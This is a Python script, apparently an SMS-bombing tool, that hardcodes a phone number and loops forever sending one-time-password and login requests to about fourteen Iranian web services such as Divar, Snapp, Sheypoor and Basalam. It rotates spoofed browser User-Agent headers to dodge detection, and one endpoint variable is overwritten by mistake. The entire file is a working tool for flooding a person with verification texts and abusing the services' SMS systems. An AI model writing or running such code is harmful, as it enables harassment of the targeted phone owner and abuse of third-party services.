import requests
import random
import time

#number = input("Enter number (937.........) :")
number = "9960990587"

url_divar = "	https://api.divar.ir/v5/auth/authenticate"
json_divar = {"phone":number}

url_snapp = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
json_snapp = {"cellphone":"+98" + number}

url_sheypoor= "https://www.sheypoor.com/api/v10.0.0/auth/send"
json_sheypoor= {"username":"0" + number}

url_jet= "https://api.digikalajet.ir/user/login-register/"
json_jet= {"phone":"0" + number}

url_virgool= "https://virgool.io/api/v1.4/auth/verify"
json_virgool= {"method":"phone","identifier":"+98" + number}

url_snapp_box= "https://cpanel.snapp-box.com/api/v2/auth/otp/send"
json_snapp_box= {"phoneNumber":"0" + number}


url_banimode = "https://mobapi.banimode.com/api/v2/auth/request"
json_banimode = {"phone": "0" + number}

url_ostadkr = "https://api.ostadkr.com/login"
json_ostadkr = {"mobile": "0" + number}

url_drnext = "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token"
json_drnext = {"mobile": "0" + number}

url_snapp = f"https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{number}"

url_basalam = "https://auth.basalam.com/otp-request"
json_basalam = {
	"client_id": 11,
    "mobile": "0"+number}

url_pinorest = "https://api.pinorest.com/frontend/auth/login/mobile"
json_pinorest = {"mobile": "0"+number}

url_buskool = "https://www.buskool.com/send_verification_code"
json_buskool = {"phone": "0" + number}

url_jabama = "https://taraazws.jabama.com/api/v4/account/send-code"
json_jabama = {"mobile": "0" + number}





heads = [
    {
    'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:76.0)Gecko/20100101 Firefox/76.0',
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0)Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Debian; Linux X86_64; rv:72.0)Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
     {
    'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:76.0)Gecko/20100101 Firefox/69.0',
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Debian; Linux X86_64; rv:72.0)Gecko/20100101 Firefox/76.0",
    'Accept': '*/*'
    },
     {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/112.0',
    'accept': '*/*'
    },
    {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
    'accept': '*/*'
    }
]

while True:
    random_head = random.choice(heads)

    req_divar = requests.post(url=url_divar,json=json_divar,headers=random_head)
    print("divar",req_divar)
    req_snapp = requests.post(url=url_snapp,json=json_snapp,headers=random_head)
    print("snapp",req_snapp)
    req_sheypoor = requests.post(url=url_sheypoor,json=json_sheypoor,headers=random_head)
    print("sheypoor",req_sheypoor)
    req_jet = requests.post(url= url_jet,json=json_jet,headers=random_head)
    print("jet",req_jet)
    req_virgool = requests.post(url= url_virgool,json=json_virgool,headers=random_head)
    print("virgool",req_virgool)
    req_snapp_box = requests.post(url= url_snapp_box,json=json_snapp_box,headers=random_head)
    print("snapp_box",req_snapp_box)
    req_banimode = requests.post(url=url_banimode,json=json_banimode,headers=random_head)
    print("banimode",req_banimode)
    req_ostadkr = requests.post(url=url_ostadkr,json=json_ostadkr,headers=random_head)
    print("ostadkr",req_ostadkr)
    req_drnext = requests.post(url=url_drnext,json=json_drnext,headers=random_head)
    print("drnext",req_drnext)
    req_snapp_market = requests.post(url_snapp,data=number,headers=random_head)
    print("test",req_snapp_market)
    req_basalam = requests.post(url= url_basalam,json=json_basalam,headers=random_head)
    print("basalam",req_basalam)
    req_pinorest = requests.post(url= url_pinorest,json=json_pinorest,headers=random_head)
    print("pinorest",req_pinorest)
    req_buskool = requests.post(url= url_buskool,json=json_buskool,headers=random_head)
    print("buskool",req_buskool)
    req_jabama = requests.post(url= url_jabama,json=json_jabama,headers=random_head)
    print("jabama",req_jabama)




    time.sleep(30)